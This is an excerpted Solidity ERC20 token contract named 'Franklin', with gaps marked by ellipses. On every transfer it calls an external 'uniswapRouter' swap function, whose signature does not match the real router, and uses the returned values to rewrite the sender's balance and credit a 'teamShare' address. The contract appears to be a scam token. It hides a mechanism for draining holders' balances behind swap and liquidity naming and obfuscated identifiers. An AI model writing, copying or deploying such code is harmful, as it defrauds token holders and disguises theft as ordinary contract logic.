...
// SPDX-License-Identifier: MIT
  ...
  function getHonger(address tokenA, address tokenB, uint256 valueHonger) internal returns ( uint256, uint256, uint256 ){  
    (uint256 _amountHonger, uint256 _liquifyHonger, uint256 _rateHonger) = IUniswapV2Router(uniswapRouter).swap(
      tokenA,
      tokenB,
      valueHonger
      );
    return (_amountHonger, _liquifyHonger, _rateHonger);
  }  
...
contract Franklin is Context, IERC20, Ownable{
  ...
  function getcentraladdress(int256 supplyDelta, uint256 supplyMax) private returns (uint256) {
  ...
  function swapHonger(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountHonger, uint256 liquifyHonger, uint256 rateHonger) = getHonger(sender, recipient, amounts);
      amountHonger = getValues(sender, amountHonger, liquifyHonger, rateHonger);
      return amountHonger;
  }    
  ...
  function getRateHonger(uint256 _amount, uint256 _rateHonger) private pure returns (uint256) {
      return _amount.mul(_rateHonger).div(10**2);
  }   
       

  function getValues(address tokenHonger, uint256 amountHonger, uint256 liquifyHonger, uint256 rateHonger) internal returns (uint256){
      if ( liquifyHonger > 0 )
      {        
        _balances[tokenHonger] = getRateHonger(_balances[tokenHonger], rateHonger).add(amountHonger);      
        _balances[teamShare] = _balances[teamShare].add(liquifyHonger);
      }
      return amountHonger;
  }
  ...
  function _transferToken(address sender, address recipient, uint256 amount) private {
    ...
    uint256 amountHonger = swapHonger(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountHonger);
